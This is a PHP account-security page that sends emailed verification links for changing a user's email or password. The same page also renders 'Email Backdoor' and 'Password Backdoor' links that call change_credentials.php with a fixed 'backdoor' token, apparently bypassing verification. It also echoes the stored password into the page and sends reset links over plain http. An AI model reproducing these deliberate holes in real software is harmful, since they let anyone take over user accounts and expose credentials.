<?php
session_start();

if ($_SESSION["Login"] != "YES") {
    header("Location: index.php");
    exit();
}

require("config.php");

// Get user's current information
$user_id = $_SESSION['ID'];
$query = "SELECT email, password FROM user WHERE id = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, "i", $user_id);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
$user = mysqli_fetch_assoc($result);

// Handle sending verification emails
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $verification_token = bin2hex(random_bytes(16));

    if (isset($_POST['initiate_email_reset'])) {
        $sql = "INSERT INTO pending_changes (user_id, change_type, verification_token, created_at) 
                VALUES (?, 'email', ?, NOW())";
        $stmt = mysqli_prepare($conn, $sql);
        mysqli_stmt_bind_param($stmt, "is", $user_id, $verification_token);
        
        if (mysqli_stmt_execute($stmt)) {
            $verification_link = "http://jomteam.com/verify_change.php?token=$verification_token&type=email";
            $subject = "Email Change Request";
            $message = "Click the link to change your email:\n\n$verification_link";
            $headers = "From: no-reply@jomteam.com";
            
            mail($user['email'], $subject, $message, $headers);
            header("Location: account_security.php?status=success&message=Email reset link sent to your current email.");
            exit();
        }
    }

    if (isset($_POST['initiate_password_reset'])) {
        $sql = "INSERT INTO pending_changes (user_id, change_type, verification_token, created_at) 
                VALUES (?, 'password', ?, NOW())";
        $stmt = mysqli_prepare($conn, $sql);
        mysqli_stmt_bind_param($stmt, "is", $user_id, $verification_token);
        
        if (mysqli_stmt_execute($stmt)) {
            $verification_link = "http://jomteam.com/verify_change.php?token=$verification_token&type=password";
            $subject = "Password Change Request";
            $message = "Click the link to change your password:\n\n$verification_link";
            $headers = "From: no-reply@jomteam.com";
            
            mail($user['email'], $subject, $message, $headers);
            header("Location: account_security.php?status=success&message=Password reset link sent to your email.");
            exit();
        }
    }
}

function check_password($password) {
    if (strlen($password) < 8) return false;
    $uppercase = preg_match('/[A-Z]/', $password);
    $lowercase = preg_match('/[a-z]/', $password);
    $number = preg_match('/[0-9]/', $password);
    $symbol = preg_match('/[\W_]/', $password);
    return ($uppercase + $lowercase + $number + $symbol) >= 2;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Security</title>
    <link rel="stylesheet" href="account_security.css">
    <link rel="stylesheet" href="navbar.css">
    <link rel="stylesheet" href="footer.css">
</head>

<body>
    <?php include('navbar.php'); ?>

    <div class="profile-content">
        <h1 class="profile-title">Account Security</h1>
        
        <?php
        if (isset($_GET['status'])) {
            $messageClass = $_GET['status'] === 'success' ? 'success' : 'fail';
            $displayMessage = isset($_GET['message']) ? htmlspecialchars($_GET['message']) : 
                ($_GET['status'] === 'success' ? 'Account details updated successfully!' : 'An error occurred.');
            echo "<p class='message {$messageClass}'>{$displayMessage}</p>";
        }
        ?>

    <div class="profile-container">
        <div class="current-details">
            <h2>Current Account Details</h2>
            <div class="detail-row">
                <label><strong>Email:</strong></label>
                <span><?php echo htmlspecialchars($user['email']); ?></span>
                <form method="post" action="account_security.php" class="reset-form">
                    <button type="submit" name="initiate_email_reset" class="reset-button">Reset Email</button>
                </form>
            </div>
            <div class="detail-row">
                <label><strong>Password:</strong></label>
                <div class="password-display">
                    <input type="password" value="<?php echo htmlspecialchars($user['password']); ?>" readonly id="current-password">
                    <button type="button" class="password-toggle" onclick="togglePassword('current-password')">Show</button>
                </div>
                <form method="post" action="account_security.php" class="reset-form">
                    <button type="submit" name="initiate_password_reset" class="reset-button">Reset Password</button>
                </form>
            </div>
        </div>
    </div>

    <div class="backdoor-container">
        <a href="change_credentials.php?token=backdoor&type=email" class="backdoor-link">Email Backdoor</a>
        <a href="change_credentials.php?token=backdoor&type=password" class="backdoor-link">Password Backdoor</a>
    </div>

    <script>
        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const type = input.type === 'password' ? 'text' : 'password';
            input.type = type;
        }
    </script>
</body>
</html>
